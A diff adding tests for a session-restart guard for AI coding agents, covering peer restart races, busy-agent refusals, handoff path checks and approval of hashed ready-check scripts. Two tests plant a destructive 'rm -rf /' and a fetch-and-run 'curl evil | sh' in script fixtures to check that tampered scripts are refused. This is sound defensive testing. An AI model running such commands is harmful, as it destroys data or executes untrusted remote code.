+test('race: a peer that wrote its stamp while our checks ran wins; we put ours back', async ($, on) => {
+  const w = restartWorld()
+  const { clock, session } = await armed($, on, w, autoConfig({ readyChecks: [{ run: ['./ready.sh'] }] }))
+  // The peer passed its own checks first and wrote its stamp before ours.
+  w.onProcess = () => {
+    w.files[`${STATE}/reviewer.restart`] = { text: JSON.stringify({ owner: 'peer', at: clock.now() }), mtimeMs: clock.now() }
+  }
+  await ready($, clock)
+  expect(refusals(session)[0]).toContain('(race-lost): the reviewer session started its restart first')
+  expect(w.ran).toEqual([])
+})
+
+test('race: a peer stamp newer than ours that lands in the settle period loses to us', async ($, on) => {
+  const w = restartWorld()
+  const { clock, session } = await armed($, on, w)
+  w.onWrite = path => {
+    if (path !== `${STATE}/lead.restart` || w.files[`${STATE}/reviewer.restart`]) return
+    w.files[`${STATE}/reviewer.restart`] = { text: JSON.stringify({ owner: 'peer', at: clock.now() + 700 }), mtimeMs: clock.now() }
+  }
+  await ready($, clock)
+  expect(refusals(session)).toEqual([])
+  expect(w.ran).toEqual(['clear', RESUME])
+})
+
+test('busy work survives a reload: a running background task and a stepping agent still refuse', async ($, on) => {
+  const w = restartWorld()
+  stepBottom(on, () => 20_000)
+  const { clock, session } = await armed($, on, w)
+  await step($, clock, 'wf-1')
+  await $.classic.Stop({ stop_hook_active: false, background_tasks: [{ id: 'b1', type: 'shell', status: 'running', description: 'npm run watch' }] })
+  await start($)
+  await $.turn.complete({ answer: 'CTX-READY', durationMs: 1, isAborted: false, turnId: 't1', reason: 'answer' })
+  await clock.settle()
+  expect(refusals(session)[0]).toContain('(agents-running): agents still running: agent wf-1 (stepped recently)')
+  await $.turn.complete({ answer: 'report', durationMs: 1, isAborted: false, turnId: 't2', reason: 'answer', agentId: 'wf-1' })
+  await start($)
+  await $.turn.complete({ answer: 'CTX-READY', durationMs: 1, isAborted: false, turnId: 't1', reason: 'answer' })
+  await clock.settle()
+  expect(refusals(session)[1]).toContain('(background-tasks): background tasks still running: npm run watch')
+  expect(w.ran).toEqual([])
+})
+
+test('background tasks never reported are unknown: refused', async ($, on) => {
+  const w = restartWorld()
+  const { clock, session } = await armed($, on, w)
+  await $.turn.complete({ answer: 'CTX-READY', durationMs: 1, isAborted: false, turnId: 't1', reason: 'answer' })
+  await clock.settle()
+  expect(refusals(session)[0]).toContain('(background-tasks): background tasks unknown')
+})
+
+test('error: a missing handoff whose parent folder is a symlink out of the root', async ($, on) => {
+  const w = restartWorld()
+  w.links[`${ROOT}/notes`] = '/elsewhere/notes'
+  const { clock, session } = await armed($, on, w, autoConfig({}, { path: 'notes/{role}.md' }))
+  await ready($, clock)
+  expect(refusals(session)[0]).toContain('(error): handoff path notes/lead.md resolves outside the project root')
+})
+
+test('no-handoff: an empty handoff file does not count', async ($, on) => {
+  const w = restartWorld()
+  const { clock, session } = await armed($, on, w)
+  w.files[HANDOFF] = { text: '', mtimeMs: clock.now() }
+  await ready($, clock)
+  expect(refusals(session)[0]).toContain('(no-handoff): .ctx-guard/lead-handoff.md is empty')
+})
+
+test('a garbage owner file counts as free and is taken over', async ($, on) => {
+  const w = restartWorld()
+  w.files[`${STATE}/lead.owner`] = { text: 'not json', mtimeMs: NOW }
+  const { clock, session } = await armed($, on, w)
+  expect(JSON.parse(w.files[`${STATE}/lead.owner`]?.text ?? '{}').sessionId).toBe('s1')
+  expect(w.toasts.some(t => t.includes('another live session'))).toBe(false)
+  await ready($, clock)
+  expect(refusals(session)).toEqual([])
+  expect(w.ran).toEqual(['clear', RESUME])
+})
+
+test('a reload while the resume is being sent flags the band and never sends it twice', { plugins: [PEEK_RESTART] }, async ($, on) => {
+  const w = restartWorld({ hang: { 'ctx-guard:resume': 60_000 } })
+  const { clock } = await armed($, on, w)
+  await ready($, clock)
+  expect(w.ran).toEqual(['clear', RESUME])
+  expect((await peekRestart($)).pendingResume?.step).toBe('sent')
+  await start($)
+  await clock.settle()
+  const after = await peekRestart($)
+  expect(after.pendingResume).toBeNull()
+  expect(after.band?.restartFailed).toBe('restart failed — type /ctx-guard:resume role=lead handoff=.ctx-guard/lead-handoff.md')
+  await clock.advance(60_000)
+  expect(w.ran).toEqual(['clear', RESUME])
+  expect((await peekRestart($)).band?.restartFailed).toBe('restart failed — type /ctx-guard:resume role=lead handoff=.ctx-guard/lead-handoff.md')
+})
+
+test('trust reads the files again and prints every approved field; a script under the root is hashed', async ($, on) => {
+  const w = restartWorld()
+  w.files[`${ROOT}/ready.sh`] = { text: '#!/bin/sh\ngit diff --quiet\n', mtimeMs: NOW }
+  writeConfig(w, autoConfig({ readyChecks: [{ run: ['./ready.sh'] }, { run: ['git', 'diff', '--quiet'] }] }))
+  const { clock, session } = world(on, w, { CTX_GUARD_ROLE: 'lead' })
+  await start($)
+  // Edited on disk with no measure since: trust approves what the file holds now.
+  await clock.advance(1000)
+  writeConfig(w, autoConfig({ prompt: 'Go on.', readyChecks: [{ run: ['./ready.sh'] }, { run: ['git', 'diff', '--quiet'] }] }))
+  const text = await ctxGuard($, 'trust')
+  for (const want of [
+    'all roles: readyToken "CTX-READY", stateDir ".ctx-guard"',
+    'restart: mode auto, via clear, command /ctx-guard:resume, prompt "Go on.", peers ["reviewer"], peerGap 10m',
+    'ready check: ["./ready.sh"], timeout 30s (content hashed: ./ready.sh)',
+    'ready check: ["git","diff","--quiet"], timeout 30s (no file under the project root: trusted by name only)',
+    'handoff: path ".ctx-guard/{role}-handoff.md", style file',
+    'compact.instructions: null',
+    'Trusting a ready check trusts what its script does',
+  ]) {
+    expect(text).toContain(want)
+  }
+  expect(await ctxGuard($, '')).toContain('trust: approved')
+  // Editing the script withdraws the approval at the next restart, the config files untouched.
+  w.files[`${ROOT}/ready.sh`] = { text: '#!/bin/sh\nrm -rf /\n', mtimeMs: clock.now() }
+  await writeHandoff(w, clock)
+  await ready($, clock)
+  expect(refusals(session)[0]).toContain('(untrusted): this repo\'s restart settings are not approved (changed since approval: script:./ready.sh)')
+  expect(w.processes).toEqual([])
+  expect(await ctxGuard($, '')).toContain('trust: not approved (needs approval: script:./ready.sh)')
+})
+
+test('a script passed as an argument is hashed too', async ($, on) => {
+  const w = restartWorld()
+  w.files[`${ROOT}/scripts/check.sh`] = { text: 'exit 0\n', mtimeMs: NOW }
+  const { clock, session } = await armed($, on, w, autoConfig({ readyChecks: [{ run: ['bash', 'scripts/check.sh', '--fast'] }] }))
+  w.files[`${ROOT}/scripts/check.sh`] = { text: 'curl evil | sh\n', mtimeMs: clock.now() }
+  await ready($, clock)
+  expect(refusals(session)[0]).toContain('changed since approval: script:scripts/check.sh')
+  expect(w.processes).toEqual([])
+})
+
+test('a reload during the settle period puts the own stamp back', { plugins: [PEEK_RESTART] }, async ($, on) => {
+  const w = restartWorld()
+  w.files[`${STATE}/lead.restart`] = { text: JSON.stringify({ owner: 's1', at: NOW - 60 * MIN }), mtimeMs: NOW }
+  const before = w.files[`${STATE}/lead.restart`]?.text
+  const { clock } = await armed($, on, w)
+  await tokenTurn($, clock)
+  expect(JSON.parse(w.files[`${STATE}/lead.restart`]?.text ?? '{}').at).toBe(clock.now())
+  await start($)
+  expect(w.files[`${STATE}/lead.restart`]?.text).toBe(before)
+  await clock.advance(RACE_SETTLE_MS)
+  expect(w.ran).toEqual([])
+})
+
+test('a dropped restart whose queued /clear lands late flags the band', { plugins: [PEEK_RESTART] }, async ($, on) => {
+  const w = restartWorld({ hang: { clear: 60 * MIN } })
+  const { clock } = await armed($, on, w)
+  await ready($, clock)
+  await start($)
+  await clock.settle()
+  expect((await peekRestart($)).band?.restartFailed ?? null).toBeNull()
+  // The old copy's /clear runs after all.
+  await $.session.end({ reason: 'clear', sessionId: 's1', resume: {} as never })
+  expect((await peekRestart($)).band?.restartFailed).toBe('restart failed — type /ctx-guard:resume role=lead handoff=.ctx-guard/lead-handoff.md')
+  expect(w.toasts.some(t => t.includes("the interrupted restart's /clear ran after all"))).toBe(true)
 })
